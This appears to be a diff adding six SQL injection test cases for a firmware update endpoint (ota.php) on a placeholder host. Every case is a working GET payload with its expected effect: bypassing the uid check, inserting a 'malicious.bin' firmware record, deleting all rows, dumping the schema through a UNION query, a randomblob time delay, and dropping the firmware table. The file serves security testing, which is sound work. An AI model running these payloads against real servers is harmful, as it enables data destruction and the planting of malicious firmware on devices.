@@ -1,0 +1,29 @@
+Test Case 1: Retrieve All Firmware Entries by Bypassing UID Check
+URL: http://example.com/ota.php?uid=" OR "1"="1
+Method: GET
+Expected Result: The SQL query becomes SELECT * FROM firmware WHERE uid="" OR "1"="1", returning all entries in the firmware table. If any exist, the server may return the first matching firmware or error.
+
+Test Case 2: Inject Malicious SQL via 'update' Parameter
+URL: http://example.com/ota.php?update=evil_uid"; INSERT INTO firmware (uid, filename) VALUES ('hacked', 'malicious.bin')--&filename=legit.bin
+Method: GET
+Expected Result: The query inserts a new entry with uid='hacked' and filename='malicious.bin', demonstrating unauthorized data insertion.
+
+Test Case 3: Delete All Entries via 'delete' Parameter
+URL: http://example.com/ota.php?delete=" OR 1=1 --
+Method: GET
+Expected Result: The SQL query becomes DELETE FROM firmware WHERE uid="" OR 1=1 --", deleting all entries in the firmware table.
+
+Test Case 4: Extract Schema Information via UNION Attack (Error-Based)
+URL: http://example.com/ota.php?uid=1" UNION SELECT name, sql FROM sqlite_master --
+Method: GET
+Expected Result: If UNION is possible, the response may include database schema details (e.g., structure of firmware table).
+
+Test Case 5: Blind SQL Injection with Time Delay
+URL: http://example.com/ota.php?uid=1" AND (SELECT randomblob(1000000000)) --
+Method: GET
+Expected Result: A delay in server response indicates successful injection (SQLite3 executes randomblob, consuming resources).
+
+Test Case 6: Terminate SQL Query and Drop Table via 'update'
+URL: http://example.com/ota.php?update=1"; DROP TABLE firmware; --&filename=test.bin
+Method: GET
+Expected Result: The firmware table is deleted, causing future database operations to fail until recreated.
